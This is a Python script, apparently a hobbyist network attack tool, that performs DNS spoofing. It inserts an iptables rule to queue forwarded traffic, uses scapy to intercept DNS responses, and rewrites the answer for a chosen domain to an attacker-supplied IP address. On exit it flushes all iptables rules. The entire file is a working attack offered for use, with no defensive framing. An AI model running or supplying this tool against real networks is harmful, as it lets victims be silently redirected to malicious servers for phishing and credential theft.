#!/usr/bin/env python

__author__ = "3r4th"

import optparse
import subprocess
import netfilterqueue
import scapy.all as scapy


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--domain-name", dest="domain_name", help="Domain name to spoof")
    parser.add_option("-i", "--ip-address", dest="ip_address", help="IP address of the web server "
                                                                    "which will be displayed instead")
    (options, arguments) = parser.parse_args()
    if not options.domain_name:
        parser.error("[-] Please specify the domain name to spoof, use --help for more info")
    elif not options.ip_address:
        parser.error("[-] Please specify an ip address, use --help for more info")
    return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if str(options.domain_name) in qname:
            print("\033[1;32;49m" + "[+] Spoofing in progress ..." + "\033[1;37;49m")
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=str(options.ip_address))
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


if __name__ == "__main__":
    global options
    options = get_arguments()
    try:
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print("[+] DNS spoofing Started ...")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\033[1;31;49m" + "\n[-] Detected CTRL + C. flushing iptables ..." + "\033[1;37;49m")
        subprocess.call("iptables --flush", shell=True)
        print("\033[1;32;49m" + "[+] DNS spoofing Stopped ..." + "\033[1;37;49m")
